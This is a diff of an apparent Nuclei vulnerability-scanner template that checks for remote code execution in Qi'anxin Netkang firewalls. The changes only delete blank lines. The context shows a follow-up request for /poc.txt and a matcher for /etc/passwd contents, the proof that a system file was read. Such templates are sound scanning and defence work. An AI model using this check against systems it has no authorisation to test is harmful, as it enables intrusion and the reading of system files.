@@ -1,12 +1,10 @@
 id: qi-anxin-netkang-next-generation-firewall-rce
-
 info:
   name: Qi'anxin Netkang Next Generation Firewall RCE
   author: pikpikcu
   severity: critical
   reference: https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
   tags: rce
-
 requests:
   - raw:
       - |
@@ -20,14 +18,12 @@ requests:
         GET /poc.txt HTTP/1.1
         Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
-
     matchers-condition: and
     matchers:
       - type: regex
         regex:
           - "root:[x*]:0:0"
         part: body
-
       - type: status
         status:
           - 200
